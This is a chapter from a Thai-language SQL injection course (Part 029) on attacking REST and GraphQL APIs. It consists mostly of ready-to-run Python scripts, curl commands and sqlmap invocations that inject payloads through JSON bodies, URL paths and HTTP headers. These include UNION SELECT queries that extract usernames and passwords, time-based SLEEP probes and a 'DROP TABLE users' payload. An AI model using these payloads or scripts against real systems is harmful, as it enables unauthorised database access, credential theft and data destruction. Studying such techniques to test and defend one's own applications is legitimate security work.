# Part 029: SQL Injection ใน REST APIs

## ภาพรวม

REST APIs เป็นเป้าหมายที่น่าสนใจ เพราะมักมีการป้องกันน้อยกว่า web forms แบบดั้งเดิม

**ขั้นตอนที่ 396-415**

---

## 396. REST API Basics

```
HTTP Methods:
GET    - อ่านข้อมูล
POST   - สร้างข้อมูล
PUT    - อัปเดตข้อมูล (replace)
PATCH  - อัปเดตข้อมูล (partial)
DELETE - ลบข้อมูล

Content Types:
application/json
application/x-www-form-urlencoded
multipart/form-data
application/xml
```

---

## 397. Injection Points ใน APIs

```
1. URL parameters: GET /api/user?id=1
2. URL path: GET /api/user/1
3. JSON body: POST {"id": "1"}
4. Headers: X-User-Id: 1
5. Cookies: user_id=1
```

---

## 398. JSON Body Injection

```python
import requests

url = "http://api.example.com/v1/user"
headers = {"Content-Type": "application/json", "Authorization": "Bearer TOKEN"}

# Normal request
payload = {"id": 1}
r = requests.post(url, json=payload, headers=headers)
print(f"Normal: {r.status_code}")

# Injection payloads
injection_payloads = [
    {"id": "1 OR 1=1-- -"},
    {"id": "1 UNION SELECT 1,2,3-- -"},
    {"id": "1'; SELECT SLEEP(5)-- -"},
    {"id": 1, "username": "admin'-- -"},
]

for payload in injection_payloads:
    r = requests.post(url, json=payload, headers=headers)
    print(f"Payload: {payload} | Status: {r.status_code} | Length: {len(r.text)}")
```

---

## 399. URL Path Injection

```bash
# Normal
GET /api/users/1

# Injection
GET /api/users/1%20OR%201=1
GET /api/users/1%20UNION%20SELECT%201,2,3--
GET /api/users/1;SELECT%20SLEEP(5)--

# SQLMap กับ REST API
sqlmap -u "http://api.example.com/v1/users/1*" \
  --headers="Authorization: Bearer TOKEN" \
  --technique=B --dbs --batch
```

---

## 400. GraphQL Injection

```graphql
# GraphQL query
{
  user(id: "1") {
    username
    email
  }
}

# Injection attempt
{
  user(id: "1 OR 1=1-- -") {
    username
    email
  }
}

# Introspection (schema discovery)
{
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}
```

```python
import requests

url = "http://api.example.com/graphql"

# GraphQL introspection
query = """
{
  __schema {
    types {
      name
    }
  }
}
"""

r = requests.post(url, json={"query": query})
print(r.json())

# Injection payload
injection_query = '''
{
  user(id: "1 UNION SELECT 1,username,password FROM users-- -") {
    id
  }
}
'''

r = requests.post(url, json={"query": injection_query})
print(r.json())
```

---

## 401. Header-Based Injection

```bash
# HTTP Headers ที่อาจมี SQL injection
X-Forwarded-For: 1.2.3.4
User-Agent: Mozilla/5.0
Referer: http://example.com
X-Real-IP: 1.2.3.4
X-Custom-Header: value

# ตัวอย่าง: ระบบ log IP ที่ inject
curl -H "X-Forwarded-For: 1.1.1.1' OR '1'='1" \
  http://example.com/api/data

curl -H "User-Agent: ' UNION SELECT 1,2,3-- -" \
  http://example.com/api/data
```

```python
import requests

url = "http://api.example.com/v1/data"

# Test header-based injection
headers_payloads = [
    {"X-Forwarded-For": "1' OR '1'='1"},
    {"User-Agent": "' UNION SELECT 1,2,3-- -"},
    {"Referer": "http://attacker.com/' UNION SELECT 1,2,3-- -"},
    {"X-Real-IP": "1.1.1.1'; DROP TABLE users-- -"},
]

for header in headers_payloads:
    r = requests.get(url, headers=header)
    print(f"Header: {header} | Status: {r.status_code}")
```

---

## 402. Burp Suite API Testing

```
1. Intercept API requests
2. Send to Intruder
3. Mark injection point: id=1§INJECT§
4. Load SQLi wordlist
5. Start attack

# Fuzzing wordlists:
/usr/share/wordlists/wfuzz/injections/SQL.txt
/usr/share/sqlmap/txt/common-outputs.txt

# sqli-hunter.py - อัตโนมัติ test headers
python3 sqli-hunter.py -u http://api.example.com/v1/users/1
```

---

## 403. SQLMap กับ REST API

```bash
# GET
sqlmap -u "http://api.example.com/v1/user?id=1" \
  --headers="Authorization: Bearer TOKEN" \
  --dbs --batch

# POST JSON
sqlmap -u "http://api.example.com/v1/user" \
  --data='{"id": "1"}' \
  --content-type="application/json" \
  --headers="Authorization: Bearer TOKEN" \
  --dbs --batch

# URL path (ใช้ *)
sqlmap -u "http://api.example.com/v1/user/1*" \
  --headers="Authorization: Bearer TOKEN" \
  --dbs --batch

# ใช้ request file
# บันทึก request จาก Burp เป็น req.txt
sqlmap -r req.txt --dbs --batch
```

---

## สรุป

SQL Injection ใน APIs:
- **หลายจุด** - URL, body, headers, cookies
- **JSON body** - inject ค่าใน JSON
- **GraphQL** - introspection + injection
- **Headers** - X-Forwarded-For, User-Agent
- **SQLMap** - รองรับ REST APIs ได้ดี

---

*Part 029 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
